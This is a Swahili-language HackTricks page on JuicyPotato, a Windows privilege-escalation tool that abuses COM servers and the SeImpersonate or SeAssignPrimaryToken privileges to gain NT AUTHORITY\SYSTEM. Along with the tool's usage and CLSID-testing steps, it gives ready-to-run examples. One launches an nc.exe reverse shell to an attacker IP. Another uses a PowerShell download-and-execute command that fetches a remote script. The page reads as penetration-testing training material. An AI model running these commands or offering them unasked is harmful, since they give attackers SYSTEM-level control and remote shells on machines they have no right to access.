# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 build 1809 kuendelea. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) zinaweza kutumika **kuchukua madaraka sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. _**Angalia:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (kutumia madaraka ya dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, likiwa na kidogo cha juisi, yaani **chombo kingine cha Kupanua Madaraka ya Mitaa, kutoka Akaunti za Huduma za Windows hadi NT AUTHORITY\SYSTEM**_

#### Unaweza kupakua juicypotato kutoka [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Muhtasari <a href="#summary" id="summary"></a>

[**Kutoka kwa juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [mabadiliko yake](https://github.com/decoder-it/lonelypotato) yanatumia mnyororo wa kupanua madaraka kulingana na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na madaraka ya `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa toleo la Windows tuligundua usanidi ambapo `BITS` ulikuwa umezimwa kwa makusudi na bandari `6666` ilikuwa imechukuliwa.

Tuliamua kuunda silaha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema hello kwa Juicy Potato**.

> Kwa nadharia, angalia [Rotten Potato - Kupanua Madaraka kutoka Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na ufuate mnyororo wa viungo na marejeleo.

Tuligundua kwamba, mbali na `BITS` kuna seva kadhaa za COM tunaweza kutumia vibaya. Zinahitaji tu:

1. kuwa na uwezo wa kuanzishwa na mtumiaji wa sasa, kawaida "mtumiaji wa huduma" ambaye ana madaraka ya kuiga
2. kutekeleza interface ya `IMarshal`
3. kukimbia kama mtumiaji aliyeinuliwa (SYSTEM, Administrator, …)

Baada ya majaribio kadhaa tulipata na kujaribu orodha kubwa ya [CLSID za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye toleo mbalimbali za Windows.

### Maelezo ya Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato inakuwezesha:

- **CLSID ya Lengo** _chagua CLSID yoyote unayotaka._ [_Hapa_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kwa OS._
- **Bandari ya Kusikiliza ya COM** _mwelekeo wa bandari ya kusikiliza ya COM unayopendelea (badala ya 6666 iliyowekwa kwenye marshalled)_
- **Anwani ya IP ya Kusikiliza ya COM** _fungua seva kwenye IP yoyote_
- **Njia ya uundaji wa mchakato** _kulingana na madaraka ya mtumiaji aliyeigizwa unaweza kuchagua kutoka:_
- `CreateProcessWithToken` (inahitaji `SeImpersonate`)
- `CreateProcessAsUser` (inahitaji `SeAssignPrimaryToken`)
- `zote`
- **Mchakato wa kuzindua** _zindua executable au script ikiwa unyakuzi unafanikiwa_
- **Hoja za Mchakato** _binafsisha hoja za mchakato uliozinduliwa_
- **Anwani ya Seva ya RPC** _kwa njia ya siri unaweza kujiandikisha kwa seva ya RPC ya nje_
- **Bandari ya Seva ya RPC** _inafaa ikiwa unataka kujiandikisha kwa seva ya nje na firewall inazuia bandari `135`…_
- **MODE YA TESTI** _hasa kwa madhumuni ya majaribio, yaani, kujaribu CLSIDs. Inaunda DCOM na kuchapisha mtumiaji wa token. Angalia_ [_hapa kwa majaribio_](http://ohpe.it/juicy-potato/Test/)

### Matumizi <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Mawazo ya Mwisho <a href="#final-thoughts" id="final-thoughts"></a>

[**Kutoka juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ikiwa mtumiaji ana `SeImpersonate` au `SeAssignPrimaryToken` ruhusa basi wewe ni **SYSTEM**.

Ni karibu haiwezekani kuzuia matumizi mabaya ya COM Servers hizi zote. Unaweza kufikiria kubadilisha ruhusa za vitu hivi kupitia `DCOMCNFG` lakini bahati njema, hii itakuwa changamoto.

Suluhisho halisi ni kulinda akaunti na programu nyeti ambazo zinafanya kazi chini ya akaunti za `* SERVICE`. Kuzuia `DCOM` hakika kutazuia exploit hii lakini kunaweza kuwa na athari kubwa kwenye OS inayotegemea.

Kutoka: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Mifano

Kumbuka: Tembelea [ukurasa huu](https://ohpe.it/juicy-potato/CLSID/) kwa orodha ya CLSIDs za kujaribu.

### Pata nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uzinduzi wa CMD mpya (ikiwa una ufikiaji wa RDP)

![](<../../images/image (300).png>)

## Matatizo ya CLSID

Mara nyingi, CLSID ya kawaida ambayo JuicyPotato inatumia **haifanyi kazi** na exploit inashindwa. Kawaida, inachukua majaribio kadhaa kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSIDs za kujaribu kwa mfumo maalum wa uendeshaji, unapaswa kutembelea ukurasa huu:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Kuangalia CLSIDs**

Kwanza, utahitaji baadhi ya executable mbali na juicypotato.exe.

Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na uipakie kwenye kikao chako cha PS, na pakua na uendeshe [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSIDs zinazowezekana za kujaribu.

Kisha pakua [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(badilisha njia ya orodha ya CLSID na kwa executable ya juicypotato) na uendeshe. Itaanza kujaribu kila CLSID, na **wakati nambari ya bandari inabadilika, itamaanisha kwamba CLSID ilifanya kazi**.

**Angalia** CLSIDs zinazofanya kazi **ukitumia parameter -c**

## Marejeo

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
